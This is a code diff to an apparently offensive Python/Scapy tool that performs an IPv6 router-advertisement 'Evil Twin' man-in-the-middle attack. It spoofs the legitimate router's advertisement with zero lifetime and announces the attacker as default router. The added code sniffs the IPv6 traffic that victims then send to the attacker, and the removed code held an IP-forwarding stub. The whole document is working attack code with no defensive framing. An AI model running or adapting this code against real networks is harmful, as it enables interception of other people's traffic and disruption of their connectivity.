@@ -31,7 +31,7 @@ def sendNDP_NS(attacker_ipv6, attacker_mac, router_ip, interface):
     ICMPv6NS = ICMPv6ND_NS(tgt=router_ip[0])
     src_ll_address = ICMPv6NDOptSrcLLAddr(lladdr=attacker_mac)
     packet = ether / base / ICMPv6NS / src_ll_address
-    print(packet.show())
+    # Debug: print(packet.show())
     r = srp(packet, verbose=1, timeout=10)
     answered, unanswered = r
     if answered:
@@ -45,10 +45,10 @@ def sendNDP_NS(attacker_ipv6, attacker_mac, router_ip, interface):
 def routerBooted(router_ip, router_mac, interface):
     ether = Ether(src=router_mac, dst='33:33:00:00:00:02')
     base = IPv6(src=router_ip, dst='ff02::1')
-    RA = ICMPv6ND_RA(O=1, routerlifetime=1)
+    RA = ICMPv6ND_RA(O=1, routerlifetime=0)
     ll_address = ICMPv6NDOptSrcLLAddr(lladdr=router_mac)
     packet = ether / base / RA / ll_address
-    print(packet.show())
+    # Debug: print(packet.show())
     sendp(packet, iface=interface, verbose=0)
     pass
 
@@ -59,48 +59,17 @@ def sendEvilTwin(interface, attacker_ipv6, attacker_mac):
     RA = ICMPv6ND_RA(routerlifetime=65535)
     ll_address = ICMPv6NDOptSrcLLAddr(lladdr=attacker_mac)
     packet = ether / base / RA / ll_address
-    print("Sending Evil Twin RA")
-    print(packet.show())
+    # Debug: print("Sending Evil Twin RA")
+    # Debug: print(packet.show())
     sendp(packet, iface=interface, verbose=0)
 
     pass
 
 
 def packet_analyzer(packet):
-    # We want to intercept and extract:
-    dst_mac = ""
-    dst_ip = ""
-    src_mac = ""
-    src_ip = ""
-
-    if Ether in packet and IP in packet:
-        src_mac = packet[Ether].src
-        dst_mac = packet[Ether].dst
-        src_ip = packet[IP].src
-        dst_ip = packet[IP].dst
-    for ipv, macv in hackedMachines:
-        if ipv == dst_ip:
-            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-
-    '''
-	    	if src_mac == macv and dst_mac == attacker_mac: 
-	    		packet[Ether].dst = getMacAddress(src_ip)
-	    		packet[Ether].src = attacker_mac
-	    		sendp(packet)
-	    		break
-	    	if dst_mac == attacer_mac and ipv == dst_ip: 
-	    		packet[Ether].dst = macv
-	    		packet[Ether].src = attacker_mac
-	    		sendp(packet)
-	    		break
-	 '''
-
-    return None
-
-
-def startSniffer():
-    a = sniff(filter="ip", prn=packet_analyzer)
-    pass
+    if IPv6 in packet:
+        print("Packet captured:")
+        print(f"{packet[IPv6].src} -> {packet[IPv6].dst}")
 
 
 def filtered_ips(attacker_ipv6, output):
@@ -150,6 +119,14 @@ def main():
             time.sleep(2)
 
     sniffer_thread = threading.Thread(target=EvilTwinAttack)
+    sniffer_thread.start()
+
+    def startSniffer():
+        sniff_filter = f"ip6 and dst host {attacker_ipv6}"
+        sniff(iface=interface, filter=sniff_filter, prn=packet_analyzer)
+        pass
+
+    sniffer_thread = threading.Thread(target=startSniffer)
     sniffer_thread.start()
 
 
